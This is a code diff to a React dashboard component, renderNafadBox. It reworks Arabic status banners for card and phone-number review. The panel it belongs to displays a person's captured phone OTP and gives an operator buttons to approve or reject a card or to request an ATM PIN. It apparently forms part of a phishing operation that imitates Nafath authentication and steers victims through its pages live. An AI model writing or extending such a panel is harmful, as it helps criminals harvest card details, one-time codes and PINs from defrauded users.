@@ -2821,9 +2821,23 @@ const renderNafadBox = () => {
               </div>
             </div>
             
-            <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-              ⏳ في انتظار المراجعة فقط
-            </div>
+            {!cardActionStatus ? (
+              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                ⏳ في انتظار المراجعة فقط
+              </div>
+            ) : cardActionStatus === "approved" ? (
+              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                ✓ تمت الموافقة
+              </div>
+            ) : cardActionStatus === "rejected" ? (
+              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                ✗ تم رفض البطاقة
+              </div>
+            ) : (
+              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dbeafe", color: "#1e40af", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                🔐 رمز ATM
+              </div>
+            )}
             {showCardDecisionButtons && !cardActionStatus && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                 <button onClick={async () => { 
@@ -2886,23 +2900,6 @@ const renderNafadBox = () => {
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   PIN
                 </button>
-              </div>
-            )}
-            {cardActionStatus && (
-              <div style={{ 
-                display: "flex", 
-                justifyContent: "center", 
-                marginTop: 10,
-                padding: "8px 12px",
-                borderRadius: 8,
-                background: cardActionStatus === "approved" ? "#dcfce7" : cardActionStatus === "rejected" ? "#fee2e2" : "#dbeafe",
-                color: cardActionStatus === "approved" ? "#166534" : cardActionStatus === "rejected" ? "#991b1b" : "#1e40af",
-                fontWeight: 600,
-                fontSize: "0.9rem"
-              }}>
-                {cardActionStatus === "approved" && "✓ تمت الموافقة"}
-                {cardActionStatus === "rejected" && "✗ تم رفض البطاقة"}
-                {cardActionStatus === "pin" && "🔐 رمز ATM"}
               </div>
             )}
             
@@ -3524,9 +3521,19 @@ const renderNafadBox = () => {
                   <p style={{ margin: 0, fontSize: "18px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
                 </div>
               )}
-              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                ⏳ في انتظار المراجعة فقط
-              </div>
+              {!phoneActionStatus ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ⏳ في انتظار المراجعة فقط
+                </div>
+              ) : phoneActionStatus === "approved" ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✓ تمت الموافقة - العميل يُوجه للصفحة التالية
+                </div>
+              ) : (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✗ تم رفض رقم الهاتف - العميل سيُعيد المحاولة
+                </div>
+              )}
               {showPhoneDecisionButtons && !phoneActionStatus && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => { 
@@ -3569,22 +3576,6 @@ const renderNafadBox = () => {
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
-                </div>
-              )}
-              {phoneActionStatus && (
-                <div style={{ 
-                  display: "flex", 
-                  justifyContent: "center", 
-                  marginTop: 10,
-                  padding: "8px 12px",
-                  borderRadius: 8,
-                  background: phoneActionStatus === "approved" ? "#dcfce7" : "#fee2e2",
-                  color: phoneActionStatus === "approved" ? "#166534" : "#991b1b",
-                  fontWeight: 600,
-                  fontSize: "0.9rem"
-                }}>
-                  {phoneActionStatus === "approved" && "✓ تمت الموافقة"}
-                  {phoneActionStatus === "rejected" && "✗ تم رفض رقم الهاتف"}
                 </div>
               )}
             </div>
